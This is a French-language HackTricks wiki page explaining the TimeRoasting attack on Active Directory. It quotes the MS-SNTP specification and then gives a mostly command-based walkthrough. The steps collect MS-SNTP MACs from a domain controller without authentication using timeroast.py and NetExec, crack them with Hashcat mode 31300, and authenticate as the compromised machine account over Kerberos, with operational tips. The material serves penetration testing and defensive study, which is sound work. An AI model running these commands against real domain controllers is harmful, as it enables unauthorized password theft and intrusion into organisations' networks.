# TimeRoasting

{{#include ../../banners/hacktricks-training.md}}

TimeRoasting exploite l'extension d'authentification MS-SNTP héritée. Dans MS-SNTP, un client peut envoyer une requête de 68 octets qui intègre n'importe quel RID de compte ordinateur ; le contrôleur de domaine utilise le hash NTLM du compte ordinateur (MD4) comme clé pour calculer un MAC sur la réponse et la renvoyer. Les attaquants peuvent collecter ces MACs MS-SNTP de manière non authentifiée et les cracker hors ligne (Hashcat mode 31300) pour récupérer les mots de passe des comptes ordinateurs.

Voir la section 3.1.5.1 "Authentication Request Behavior" et 4 "Protocol Examples" de la spécification officielle MS-SNTP pour les détails.
![](../../images/Pasted%20image%2020250709114508.png)
> If the ExtendedAuthenticatorSupported ADM element is false, the client MUST construct a Client NTP Request message. The Client NTP Request message length is 68 bytes. The client sets the Authenticator field of the Client NTP Request message as described in section 2.2.1, writing the least significant 31 bits of the RID value into the least significant 31 bits of the Key Identifier subfield of the authenticator, and then writing the Key Selector value into the most significant bit of the Key Identifier subfield.

Depuis la section 4 (Protocol Examples) :

> After receiving the request, the server verifies that the received message size is 68 bytes. Assuming that the received message size is 68 bytes, the server extracts the RID from the received message. The server uses it to call the NetrLogonComputeServerDigest method (as specified in [MS-NRPC] section 3.5.4.8.2) to compute the crypto-checksums and select the crypto-checksum based on the most significant bit of the Key Identifier subfield from the received message, as specified in section 3.2.5. The server then sends a response to the client, setting the Key Identifier field to 0 and the Crypto-Checksum field to the computed crypto-checksum.

Le crypto-checksum est basé sur MD5 (voir 3.2.5.1.1) et peut être craqué hors ligne, permettant l'attaque de roasting.

## Comment attaquer

[SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast) - Timeroasting scripts par Tom Tervoort
```bash
sudo ./timeroast.py 10.0.0.42 | tee ntp-hashes.txt
hashcat -m 31300 ntp-hashes.txt
```
---
## Attaque pratique (non authentifiée) avec NetExec + Hashcat

- NetExec peut énumérer et collecter les MACs MS-SNTP pour les RIDs des ordinateurs de manière non authentifiée et afficher des hashes $sntp-ms$ prêts pour le cracking:
```bash
# Target the DC (UDP/123). NetExec auto-crafts per-RID MS-SNTP requests
netexec smb <dc_fqdn_or_ip> -M timeroast
# Output example lines: $sntp-ms$*<rid>*md5*<salt>*<mac>
```
- Crack hors ligne avec Hashcat mode 31300 (MS-SNTP MAC):
```bash
hashcat -m 31300 timeroast.hashes /path/to/wordlist.txt --username
# or let recent hashcat auto-detect; keep RIDs with --username for convenience
```
- Le texte clair récupéré correspond au mot de passe d'un compte d'ordinateur. Essayez-le directement en tant que compte machine en utilisant Kerberos (-k) lorsque NTLM est désactivé :
```bash
# Example: cracked for RID 1125 -> likely IT-COMPUTER3$
netexec smb <dc_fqdn> -u IT-COMPUTER3$ -p 'RecoveredPass' -k
```
Conseils opérationnels
- Assurez-vous que l'heure est correctement synchronisée avant Kerberos: `sudo ntpdate <dc_fqdn>`
- Si nécessaire, générez krb5.conf pour le realm AD: `netexec smb <dc_fqdn> --generate-krb5-file krb5.conf`
- Associez les RIDs aux principals plus tard via LDAP/BloodHound une fois que vous disposez d'un accès authentifié.

## Références

- [MS-SNTP: Microsoft Simple Network Time Protocol](https://winprotocoldoc.z19.web.core.windows.net/MS-SNTP/%5bMS-SNTP%5d.pdf)
- [Secura – Timeroasting whitepaper](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf)
- [SecuraBV/Timeroast](https://github.com/SecuraBV/Timeroast)
- [NetExec – official docs](https://www.netexec.wiki/)
- [Hashcat mode 31300 – MS-SNTP](https://hashcat.net/wiki/doku.php?id=example_hashes)

{{#include ../../banners/hacktricks-training.md}}
